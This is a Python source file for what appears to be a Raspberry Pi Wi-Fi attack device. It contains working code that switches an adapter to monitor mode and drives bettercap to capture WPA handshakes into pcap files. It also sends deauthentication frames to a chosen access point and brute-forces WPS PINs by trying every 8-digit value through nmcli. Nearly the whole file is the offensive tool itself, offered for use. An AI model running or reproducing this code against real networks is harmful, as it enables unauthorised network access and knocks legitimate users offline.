from lib.mojstd import *
import RPi.GPIO as GPIO
import os
import subprocess
import time


bk_ = 0

class netstd():
    def __init__(self, INTERFACE, selected_option=None, wps_pin=None):
        self.INTERFACE = INTERFACE
        self.bettercap_process = subprocess.Popen(
            ['sudo', 'bettercap', '-iface', f'{INTERFACE}'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )

    def run_result(self, selected_option, INTERFACE, wps_pin):
        result = subprocess.run(
                    ["nmcli", "dev", "wifi", "connect", selected_option, "infname", INTERFACE, "--wps-wps_pin", wps_pin],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
        return result


    def bk(self):
        if GPIO.input(KEY3_PIN) == 0:
            return True

    def interface_select(self, INTERFACE):
        test = os.popen(f"iwconfig {self.INTERFACE} ")
        out = test.read()


        if "No such device" in out:
            return 1

        else:
            pass
            return 0

    def interface_start(self, INTERFACE):
        time.sleep(0.5)
        os.system(f"sudo ifconfig {INTERFACE} down")
        os.system(f"sudo airmon-ng start {INTERFACE}")
        os.system(f"sudo ifconfig {INTERFACE} up")
        os.system(f"sudo airmon-ng check {INTERFACE} && sudo airmon-ng check kill")

        if self.bk() == True:
            return 1
        else:
            return 0

    def initialization(self, selected_chan, selected_bssid, INTERFACE):
        bk_ = 0
        commands = [
            'wifi.recon on',
            'wifi.show',
            f'set wifi.recon channel {selected_chan}',
            'set net.sniff.verbose true',
            'set net.sniff.filter ether proto 0x888e',
            f'set net.sniff.output /home/kali/mojito/wpa_{selected_bssid}_.pcap',
            'net.sniff on',
            f'wifi.deauth {selected_bssid}'
        ]

        messages = [
            "Starting Recon...",
            "Examining Networks...",
            "Setting Channel...",
            "Setting Verbose...",
            "Setting Filter...",
            "Setting Output...",
            "Starting Sniff...",
            "Deauthing..."
        ]

        self.__init__(self.INTERFACE)
        time.sleep(0.5)
        for i in commands:

            #key3
            if self.bk() == True:
                return 1

            time.sleep(4)
            ui_print(f"Loading ({commands.index(i)})", 0.5)
            self.bettercap_process.stdin.write(i+'\n')

            #key3
            if self.bk() == True:
                return 1

            self.bettercap_process.stdin.flush()
            ui_print(messages[commands.index(i)], 1)

            #Write output
            with open("/home/kali/mojito/logs/output.txt", 'a') as file:
                file.write(self.bettercap_process.stdout.readline())

        return 0
    


    #WPS



    def generate(self):
        for var in range(0, 100000000):
            yield f"{var:08d}"  

    def connect(self, selected_option, wps_pin, INTERFACE):
        try:
            result = self.run_result(selected_option, INTERFACE, wps_pin)

            if "successfully activated" in result.stdout.lower():
                ui_print(f"Connected'{selected_option}' \n PIN: {wps_pin}", 5)
                return 0
            else:
                ui_print(f"PIN {wps_pin} failed.")
                return 1
            
        except Exception as e:
            ui_print(f"Error {wps_pin}:\n {e}")
            with open("/home/kali/mojito/logs/output2.txt", 'a') as file:
                file.write(f"Error {wps_pin}:\n {e}")
            return 1

    def brute_force_wps(self, selected_option, INTERFACE):
        for wps_pin in self.generate():
            if self.connect(selected_option, wps_pin, INTERFACE) == 0:
                ui_print(f"PIN : {wps_pin}")
                break
            else:
                pass
            time.sleep(0.1)
        return 0




    # network_ssid = getinput() 
    # brute_force_wps(network_ssid)
    

        
